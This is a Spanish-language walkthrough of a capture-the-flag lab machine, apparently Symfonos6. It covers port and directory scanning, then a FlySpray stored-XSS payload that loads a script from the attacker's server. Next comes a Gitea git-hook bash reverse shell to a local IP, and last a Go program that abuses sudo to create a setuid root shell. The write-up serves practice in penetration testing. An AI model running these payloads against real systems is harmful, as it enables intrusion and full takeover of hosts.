1. Escaneo de puertos abiertos 
```
nmap -p- --open --min-rate 5000 -n -Pn -vvv -sSC 192.168.18.163
```
Impresión 
```
Discovered open port 22/tcp on 192.168.18.163
Discovered open port 80/tcp on 192.168.18.163
Discovered open port 3306/tcp on 192.168.18.163
Discovered open port 3000/tcp on 192.168.18.163
```

2. Búsqueda de directorios potenciales
```
gobuster dir -t 20 -w /usr/share/wordlists/dirb/common.txt -u http://192.168.18.163/
```
Impresión
```
/flyspray             (Status: 301) [Size: 239] [--> http://192.168.18.163/flyspray/]
```
**Nota:** `flyspray` es un software para diligenciar tareas.

3. Buscar vulnerabilidades
```
searchsploit flyspray
```
Impresión 
```
FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery            
```
Descargar recurso 
```
searchsploit -m php/webapps/41918.txt
```

4. Investigando la vulnerabilidad, en `https://seclists.org/fulldisclosure/2017/Apr/99` hay un apartado que es vulnerable a inyectar código HTML.
5. Copiar y editar (Tiene errores de espacio) el script de la vulnerabilidad `4191.txt` y colocarle extensión `.js` 
6. Abrir un puerto para compartir el recurso 
```
python3 -m http.server 80
```
7. Inyectar código script en el apartado `Real name` en `index.php?do=myprofile` (donde es posible actualizar los datos del usuario registrado), con la ruta para compartir el archivo malicioso.
```
"><script src=http://192.168.18.137/script.js></script>
```

8. Registrarse como el usuario `hacker:12345678`

9. Ingresar a la segunda tarea donde estarán las credenciales de `achilles:h2sBr9gryBunKdF9`

10.  Registrarse con las credenciales en el la ruta `http://192.168.18.163:3000/` que este es uno de los puertos abiertos.

11. Estando adentro, entrar a cualquiera de los repositorios ir a `Ajustes` luego ir a `Git Hooks`, luego editar cualquiera de los archivos puede ser `pre-receive`, con la siguiente ReverShell
```
bash -c 'bash -i >& /dev/tcp/192.168.18.137/443 0>&1'
```

12. Para activar la Shell se debe hacer un `commid` en el archivo `index.php` del repositorio escogido, puede ser añadir un comentario y listo.

13.  Estando dentro entrar al usuario `achilles` con las credenciales
14. Para la escalada de privilegios
```
sudo -l
```
Impresión
```
User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```
**Nota:** El binario `go` se ejecuta como root y no necesita contraseña.

15. Entrar el directorio `tmp/` crear un archivo con `vim` con extención `.go`
```go
package main

import (
    "fmt"
    "log"
    "os/exec"
)

func main() {
    out, err := exec.Command("/bin/bash", "-c", "cp /bin/bash /tmp/pwnshell; chmod +xs /tmp/pwnshell").Outpu
t()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(string(out))
}
```
**Nota:** Este script crea un archivo `pwnshell` que proporciona una shell al usarlo 

Ejecutarlo con 
```
sudo /usr/local/go/bin/go run cmd.go
```
Y luego ejecutar el archivo
```
/tmp/pwnshell -p
```
